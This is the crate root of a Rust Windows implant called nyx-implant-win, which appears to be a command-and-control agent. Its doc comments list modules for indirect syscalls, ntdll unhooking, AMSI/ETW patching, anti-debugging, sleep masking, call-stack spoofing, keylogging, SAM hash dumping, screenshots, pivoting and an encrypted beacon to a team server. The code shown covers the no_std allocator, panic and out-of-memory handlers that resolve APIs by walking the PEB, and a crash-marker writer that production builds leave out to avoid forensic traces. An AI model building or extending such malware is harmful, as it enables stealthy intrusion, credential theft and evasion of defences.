//! nyx-implant-win — Windows position-independent implant.
//!
//! This crate builds the real Windows PIC agent: `#![no_std]` + `#![no_main]`,
//! a custom NT-Heap allocator, PEB-walk API resolution, indirect syscalls, and
//! a task loop that reuses [`nyx_protocol`] for the encrypted beacon frame.
//!
//! ## Build
//! Requires nightly + the `x86_64-pc-windows-gnu` (or msvc) target. It is
//! intentionally NOT a workspace member so `cargo build --workspace` stays green
//! on the macOS dev host. Check it standalone:
//!
//! ```text
//! cargo +nightly check -p nyx-implant-win --target x86_64-pc-windows-gnu
//! ```
//!
//! Full link + the sRDI PIC-extraction step happen on a Windows host.
//!
//! ## Modules
//! - [`heap`] — alloc glue (Vec/String + a raw-byte `Str`) for the PEB walk.
//! - [`ntalloc`] — bump allocator over `NtAllocateVirtualMemory`, registered as
//!   the `#[global_allocator]` (the `NtHeapAllocator` name is historical).
//! - [`resolve`] — PEB walk + djb2 API resolution; `LiveNtdll` impls
//!   `nyx_evasion::SyscallSource` so the SSN resolver runs over the *live* ntdll.
//! - [`syscalls`] — indirect-syscall runtime (SSN table + ntdll `syscall;ret`
//!   gadget + RX trampoline); 4/6/11-arg wrappers + a process-wide global.
//! - [`unhook`] — KnownDlls `\ntdll` fresh-map (+ disk fallback) unhook.
//! - [`blind`] — AMSI/ETW userland byte-patch (idempotent; AMSI retried/cycle).
//! - [`antidebug`] — BeingDebugged / ProcessDebugPort / uptime checks.
//! - [`kits`] — CS-style kit seams: `SleepmaskKit`/`ProcessInjectKit` (real
//!   P2 impls via `evasion_glue`). [`stack`]/[`sleep`]/[`mem`] are the matching
//!   live modules (call-stack spoof / sleep mask / memory encryption).
//! - [`config`] — per-build encrypted config (`nyx_config_macros::embed!`).
//! - [`beacon`] — the task loop (check-in → POST → receive → execute); every
//!   wire `Command`. [`envelopes`] bakes the malleable-C2 shapes it sends.
//! - [`transport`] — WinHTTP POST for the beacon frame (TLS via WINHTTP_FLAG_SECURE).
//! - [`hostinfo`] — real `SessionInfo` (hostname/user/pid/admin/beacon_id).
//! - [`fs`] / [`shell`] / [`recon`] — file ops (NT syscalls), shell, recon.
//! - [`bof`] — W^X COFF loader + Beacon-API shims.
//! - [`screenshot`] / [`keylog`] / [`hashdump`] — screen, polling keys, SAM hive.
//! - [`pivot`] / [`postex`] — SOCKS relay across cycles / token ops.
//! - [`entry`] / [`selftests`] — PIC entry + per-module `rundll32` self-tests.

#![cfg_attr(not(test), no_std)]
#![cfg_attr(not(test), no_main)]
// `#[alloc_error_handler]` is a nightly language feature (still unstable as of
// the pinned toolchain era — see the Rust Unstable Book `alloc-error-handler`
// page). It replaces the default no_std OOM path (a nounwind panic that the
// `#[panic_handler]` would abort on) with the recoverable handler below. Only
// needed for the shipped no_std build; test mode links std.
#![cfg_attr(not(test), feature(alloc_error_handler))]

extern crate alloc;

// Team server long-term pubkey, baked at build time by build.rs (H7). A real
// engagement sets NYX_SERVER_PUB; dev builds fall back to a marked test key.
// Either way it is a valid (non-identity) X25519 point so the ECDH no longer
// collapses and session keys are genuinely derived.
mod server_pub {
    include!(concat!(env!("OUT_DIR"), "/server_pub.rs"));
}

pub mod heap;

#[cfg(target_os = "windows")]
pub mod antidebug;
#[cfg(target_os = "windows")]
pub mod beacon;
#[cfg(target_os = "windows")]
pub mod cell;

pub mod cfg_user;

#[cfg(target_os = "windows")]
pub mod blind;
#[cfg(target_os = "windows")]
pub mod blind_hwbp;
#[cfg(target_os = "windows")]
pub mod bof;
#[cfg(target_os = "windows")]
pub mod caller_spoof;
#[cfg(target_os = "windows")]
pub mod channels;
#[cfg(target_os = "windows")]
pub mod config;
#[cfg(target_os = "windows")]
pub mod config_placeholder;
#[cfg(target_os = "windows")]
pub mod context;
#[cfg(target_os = "windows")]
pub mod dllmain;
#[cfg(target_os = "windows")]
pub mod entry;
#[cfg(target_os = "windows")]
pub mod env_keying;
#[cfg(target_os = "windows")]
pub mod envelopes;
#[cfg(target_os = "windows")]
pub mod envprobe;
#[cfg(target_os = "windows")]
pub mod evasion_glue;
pub mod fluctuation;
pub mod fluctuation_thunk;
pub mod fmt;
#[cfg(target_os = "windows")]
pub mod fs;
#[cfg(target_os = "windows")]
pub mod hashdump;
#[cfg(target_os = "windows")]
pub mod hookchain;
#[cfg(target_os = "windows")]
pub mod hostinfo;
pub mod inject;
#[cfg(target_os = "windows")]
pub mod insomniac;
#[cfg(target_os = "windows")]
pub mod keylog;
#[cfg(target_os = "windows")]
pub mod kits;
#[cfg(target_os = "windows")]
pub mod lacuna;
#[cfg(target_os = "windows")]
pub mod lacuna_stomp;
#[cfg(target_os = "windows")]
pub mod mem;
#[cfg(target_os = "windows")]
pub mod ntalloc;
#[cfg(target_os = "windows")]
pub mod pivot;
#[cfg(target_os = "windows")]
pub mod postex;
#[cfg(target_os = "windows")]
pub mod proxy_veh;
#[cfg(target_os = "windows")]
pub mod recon;
#[cfg(target_os = "windows")]
pub mod resolve;
#[cfg(target_os = "windows")]
pub mod screenshot;
#[cfg(target_os = "windows")]
pub mod selftests;
#[cfg(target_os = "windows")]
pub mod shell;
#[cfg(target_os = "windows")]
pub mod sleep;
#[cfg(target_os = "windows")]
pub mod stack;
#[cfg(target_os = "windows")]
pub mod syscalls;
#[cfg(target_os = "windows")]
pub mod tp;
#[cfg(target_os = "windows")]
pub mod transport;
#[cfg(target_os = "windows")]
pub mod trex;
#[cfg(target_os = "windows")]
pub mod unhook;
#[cfg(target_os = "windows")]
pub mod version;

// Register the NT-Heap allocator so Vec/String work under #![no_std].
// In test mode (std available), use the default allocator — the NT allocator
// would crash because Rust's std runtime allocates before init_global() is called.
#[cfg(all(target_os = "windows", not(test)))]
#[global_allocator]
static HEAP: ntalloc::NtHeapAllocator = ntalloc::NtHeapAllocator;

#[cfg(not(test))]
#[panic_handler]
fn _panic(info: &core::panic::PanicInfo) -> ! {
    // panic = abort. In a PIC implant an infinite spin is a loud IOC (one core
    // pinned at 100%), so prefer a clean process exit. We can only resolve
    // ExitProcess on Windows; on the dev host (no target_os=windows) trap.
    #[cfg(target_os = "windows")]
    {
        // Crash marker BEFORE ExitProcess so headless crashes are debuggable:
        // writes `%TEMP%\nyx_panic.txt` with the panic location (nyx_diag
        // builds only — production leaves no forensic file, matching
        // `entry::diag_mark`). Best-effort; never panics itself.
        write_panic_diag(info);
        // Best-effort: resolve ExitProcess and exit with a non-zero code so the
        // host/loader reaps us. If resolution fails (catastrophic — ntdll gone),
        // fall through to the trap.
        if let Some(addr) = unsafe { resolve::export_addr(b"kernel32.dll", b"ExitProcess") } {
            let f: extern "system" fn(u32) -> ! = unsafe { core::mem::transmute(addr) };
            // Touch `info` so it's "used" and not dropped with a warning.
            let _ = info;
            f(0xC000_0001);
        }
    }
    // Defensive trap — only reached if we can't exit cleanly.
    let _ = info;
    loop {
        core::hint::spin_loop();
    }
}

/// Best-effort crash marker for the panic path: writes
/// `%TEMP%\nyx_panic.txt` (fallback `C:\Windows\Temp\nyx_panic.txt`) with the
/// panic location via kernel32/kernelbase `GetEnvironmentVariableW` +
/// `CreateFileW` + `WriteFile` + `CloseHandle` resolved through the PEB walk
/// (no std, no allocator — the panic path must not allocate). The file exists
/// so a headless crash leaves an identifiable artifact even when nothing else
/// (loader log, exit code) was captured. Gated on `nyx_diag` exactly like
/// `entry::diag_mark`; production builds compile to a no-op and leave no
/// forensic file on the target host.
#[cfg(all(target_os = "windows", nyx_diag, not(test)))]
fn write_panic_diag(info: &core::panic::PanicInfo) {
    let Some((gev, cf, wf, ch)) = write_panic_diag_resolve() else {
        return;
    };
    let path16 = write_panic_diag_build_path(gev);
    let (body, blen) = write_panic_diag_format(info);
    unsafe { write_panic_diag_write_file(cf, wf, ch, &path16, &body, blen) };
}

/// Resolve GetEnvironmentVariableW/CreateFileW/WriteFile/CloseHandle (kernel32,
/// falling back to kernelbase). None if any is missing.
#[cfg(all(target_os = "windows", nyx_diag, not(test)))]
fn write_panic_diag_resolve() -> Option<(usize, usize, usize, usize)> {
    let (Some(gev), Some(cf), Some(wf), Some(ch)) = (
        unsafe { resolve::export_addr(b"kernel32.dll", b"GetEnvironmentVariableW") }.or_else(
            || unsafe { resolve::export_addr(b"kernelbase.dll", b"GetEnvironmentVariableW") },
        ),
        unsafe { resolve::export_addr(b"kernel32.dll", b"CreateFileW") }
            .or_else(|| unsafe { resolve::export_addr(b"kernelbase.dll", b"CreateFileW") }),
        unsafe { resolve::export_addr(b"kernel32.dll", b"WriteFile") }
            .or_else(|| unsafe { resolve::export_addr(b"kernelbase.dll", b"WriteFile") }),
        unsafe { resolve::export_addr(b"kernel32.dll", b"CloseHandle") }
            .or_else(|| unsafe { resolve::export_addr(b"kernelbase.dll", b"CloseHandle") }),
    ) else {
        return None;
    };
    Some((gev, cf, wf, ch))
}

/// Build `%TEMP%\nyx_panic.txt` as a fixed UTF-16 stack buffer (no allocation);
/// falls back to `C:\Windows\Temp` when TEMP is unset/oversized.
#[cfg(all(target_os = "windows", nyx_diag, not(test)))]
fn write_panic_diag_build_path(gev: usize) -> [u16; 320] {
    type GetEnvVarW = unsafe extern "system" fn(*const u16, *mut u16, u32) -> u32;
    let get_env: GetEnvVarW = unsafe { core::mem::transmute(gev) };

    // Build the path: `%TEMP%\nyx_panic.txt` as a fixed UTF-16 stack
    // buffer (no allocation). Fall back to C:\Windows\Temp if TEMP is
    // unset/oversized.
    let mut tmp16 = [0u16; 260];
    let mut name16 = [0u16; 5]; // L"TEMP\0"
    for (i, &b) in b"TEMP".iter().enumerate() {
        name16[i] = b as u16;
    }
    name16[4] = 0;
    let n = unsafe { get_env(name16.as_ptr(), tmp16.as_mut_ptr(), 260) };
    let tmp_len = if n != 0 && (n as usize) < 260 {
        n as usize
    } else {
        0
    };

    let mut path16 = [0u16; 320];
    let mut idx = 0usize;
    if tmp_len > 0 {
        for &u in &tmp16[..tmp_len] {
            if idx < path16.len() {
                path16[idx] = u;
                idx += 1;
            }
        }
    } else {
        for u in "C:\\Windows\\Temp".encode_utf16() {
            if idx < path16.len() {
                path16[idx] = u;
                idx += 1;
            }
        }
    }
    for &b in b"\\nyx_panic.txt".iter() {
        if idx < path16.len() {
            path16[idx] = b as u16;
            idx += 1;
        }
    }
    if idx < path16.len() {
        path16[idx] = 0;
    }
    path16
}

/// Compose the marker body: `panic at <file>:<line>\n` (ASCII). Returns the
/// buffer plus the used length (the trailing bytes stay zeroed).
#[cfg(all(target_os = "windows", nyx_diag, not(test)))]
fn write_panic_diag_format(info: &core::panic::PanicInfo) -> ([u8; 256], usize) {
    // Compose the marker body: `panic at <file>:<line>\n` (ASCII).
    let mut body = [0u8; 256];
    let mut blen = 0usize;
    for &b in b"panic at ".iter() {
        if blen < body.len() {
            body[blen] = b;
            blen += 1;
        }
    }
    if let Some(loc) = info.location() {
        for &b in loc.file().as_bytes().iter() {
            if blen < body.len() {
                body[blen] = b;
                blen += 1;
            }
        }
        if blen < body.len() {
            body[blen] = b':';
            blen += 1;
        }
        let mut line = loc.line();
        let mut digits = [0u8; 10];
        let mut nd = 0usize;
        if line == 0 {
            digits[0] = b'0';
            nd = 1;
        }
        while line > 0 {
            digits[nd] = b'0' + (line % 10) as u8;
            line /= 10;
            nd += 1;
        }
        for i in (0..nd).rev() {
            if blen < body.len() {
                body[blen] = digits[i];
                blen += 1;
            }
        }
    }
    if blen < body.len() {
        body[blen] = b'\n';
        blen += 1;
    }
    (body, blen)
}

/// CreateFileW + WriteFile + CloseHandle on the built path. Best-effort.
#[cfg(all(target_os = "windows", nyx_diag, not(test)))]
unsafe fn write_panic_diag_write_file(
    cf: usize,
    wf: usize,
    ch: usize,
    path16: &[u16; 320],
    body: &[u8],
    blen: usize,
) {
    use core::ffi::c_void;
    type CreateFileW = unsafe extern "system" fn(
        *const u16,
        u32,
        u32,
        *mut c_void,
        u32,
        u32,
        *mut c_void,
    ) -> *mut c_void;
    type WriteFile =
        unsafe extern "system" fn(*mut c_void, *const u8, u32, *mut u32, *mut c_void) -> i32;
    type CloseHandle = unsafe extern "system" fn(*mut c_void) -> i32;

    let create: CreateFileW = core::mem::transmute(cf);
    let write: WriteFile = core::mem::transmute(wf);
    let close: CloseHandle = core::mem::transmute(ch);

    // GENERIC_WRITE=0x40000000, FILE_SHARE_WRITE=2, CREATE_ALWAYS=2,
    // FILE_ATTRIBUTE_NORMAL=0x80 (mirrors `entry::diag_mark`).
    let h = create(
        path16.as_ptr(),
        0x4000_0000,
        2,
        core::ptr::null_mut(),
        2,
        0x80,
        core::ptr::null_mut(),
    );
    if h.is_null() || h as usize == usize::MAX {
        return;
    }
    let mut written: u32 = 0;
    let _ = write(
        h,
        body.as_ptr(),
        blen as u32,
        &mut written,
        core::ptr::null_mut(),
    );
    let _ = close(h);
}

/// Production / non-Windows fallback: no crash marker (see the `nyx_diag`
/// variant for the real writer). `#[allow(dead_code)]`: only the real writer
/// is referenced from `_panic` (which itself only exists in `not(test)`
/// builds), so test-mode / dev-host builds would otherwise flag this.
#[cfg(not(all(target_os = "windows", nyx_diag, not(test))))]
#[allow(dead_code)]
fn write_panic_diag(_info: &core::panic::PanicInfo) {}

/// Size (bytes) of the most recent failed allocation, or 0 if none was ever
/// recorded. Set by [`_alloc_error`] before the beacon enters its safe error
/// state; it is the observable "minimal error flag" this architecture allows.
/// A real error FRAME is not possible from the OOM path: encoding, sealing,
/// and POSTing a frame all allocate (wire `Writer`, AEAD output, WinHTTP
/// buffers), and we are already inside the allocation-failure path — see
/// [`_alloc_error`] for the full rationale.
static ALLOC_OOM_SIZE: core::sync::atomic::AtomicU64 = core::sync::atomic::AtomicU64::new(0);

/// Last recorded allocation-failure size (0 = no OOM observed since boot).
/// Intended for diagnostics / a future in-process watchdog; not consulted by
/// any shipped hot path.
pub fn alloc_oom_size() -> u64 {
    ALLOC_OOM_SIZE.load(core::sync::atomic::Ordering::Relaxed)
}

/// Allocation-failure handler (the modern `#[alloc_error_handler]`; OOM is no
/// longer an abort on this toolchain — rustc routes `handle_alloc_error` here
/// when the attribute is present, else to a default nounwind panic).
///
/// # Recoverable-OOM design (what the no_std architecture allows)
/// The handler MUST diverge (`-> !`), so the beacon loop cannot resume after
/// an OOM. What we CAN do without allocating:
///   1. record the failed size in [`ALLOC_OOM_SIZE`] (the minimal error flag),
///   2. drop a `diag_mark` (allocation-free; compile-time no-op in production
///      builds) so nyx_diag builds leave a marker,
///   3. exit cleanly with a DEDICATED exit code (`0xAD`) instead of the
///      default path's panic → `ExitProcess(0xC000_0001)`. The distinct code
///      lets the loader/harness tell an OOM apart from a crash and restart the
///      beacon — the recoverable outcome for the operator.
/// A wire error frame is intentionally NOT attempted: every step of the
/// existing send path (`encode_batch` → `encode_frame` → `dispatch_send_recv`)
/// allocates, and re-entering it from inside the allocator-failure path would
/// recurse into the OOM handler.
#[cfg(not(test))]
#[alloc_error_handler]
fn _alloc_error(layout: core::alloc::Layout) -> ! {
    ALLOC_OOM_SIZE.store(layout.size() as u64, core::sync::atomic::Ordering::Relaxed);
    #[cfg(target_os = "windows")]
    {
        crate::entry::diag_mark(b"ERR_ALLOC_OOM");
        // Best-effort clean exit with the dedicated OOM code. If ExitProcess
        // can't be resolved (catastrophic — ntdll/kernel32 gone), fall through
        // to the defensive trap, mirroring the panic handler.
        if let Some(addr) = unsafe { resolve::export_addr(b"kernel32.dll", b"ExitProcess") } {
            let f: extern "system" fn(u32) -> ! = unsafe { core::mem::transmute(addr) };
            f(0xAD);
        }
    }
    // Defensive trap — only reached if we can't exit cleanly.
    loop {
        core::hint::spin_loop();
    }
}
